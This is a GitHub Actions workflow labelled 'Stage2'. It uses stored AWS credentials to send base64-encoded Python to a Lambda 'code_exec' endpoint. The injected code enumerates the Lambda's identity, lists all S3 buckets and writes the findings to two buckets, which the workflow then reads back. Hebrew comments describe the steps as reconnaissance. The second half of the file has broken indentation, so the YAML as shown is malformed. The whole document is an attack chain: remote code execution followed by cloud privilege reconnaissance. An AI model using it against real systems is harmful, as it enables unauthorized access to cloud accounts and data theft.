name: Stage2
on:
  push:
    branches: [corgi]

permissions:
  contents: read

jobs:
  recon:
    runs-on: ubuntu-latest
    env:
      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      AWS_SESSION_TOKEN: ${{ secrets.AWS_SESSION_TOKEN }}
      AWS_DEFAULT_REGION: us-east-1
    steps:
      - name: Who am I
        run: aws sts get-caller-identity
        
      - name: Recon via Lambda
        run: |
          pip install requests requests-aws4auth --quiet

          cat > /tmp/run.py << 'EOF'
          import boto3, json, base64, requests
          from requests_aws4auth import AWS4Auth
          
          API = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"
          
          session = boto3.Session()
          creds = session.get_credentials().get_frozen_credentials()
          auth = AWS4Auth(creds.access_key, creds.secret_key, 'us-east-1', 'execute-api', session_token=creds.token)
          
          def run(code):
              r = requests.post(API, json={"code": base64.b64encode(code.encode()).decode()}, auth=auth)
              print("->", r.status_code, r.text[:200])
          
          # שלב 1: מי ה-Lambda + מה היא יכולה לכתוב
          run("""
          import boto3, json
          s3 = boto3.client('s3', region_name='us-east-1')
          sts = boto3.client('sts')
          
          results = {}
          results['identity'] = str(sts.get_caller_identity())
          
          for b in ['userad88e2b168aa387e', 'logad88e2b168aa387e']:
              try:
                  s3.put_object(Bucket=b, Key='recon.json', Body=json.dumps(results))
                  results['write_'+b] = 'OK'
              except Exception as e:
                  results['write_'+b] = str(e)

                try:
                    all_b = [x['Name'] for x in s3.list_buckets().get('Buckets',[])]
                    results['all_buckets'] = all_b
                except Exception as e:
                    results['all_buckets'] = str(e)

            # נסה לכתוב שוב עם הכל
            for b in ['userad88e2b168aa387e', 'logad88e2b168aa387e']:
                try:
                    s3.put_object(Bucket=b, Key='recon.json', Body=json.dumps(results, default=str))
                except: pass
            """)
            EOF
                      python3 /tmp/run.py
            
                  - name: Read recon results from S3
                    run: |
                      echo "=== userad ==="
                      aws s3 cp s3://userad88e2b168aa387e/recon.json - 2>&1
                      echo "=== logad ==="
                      aws s3 cp s3://logad88e2b168aa387e/recon.json - 2>&1
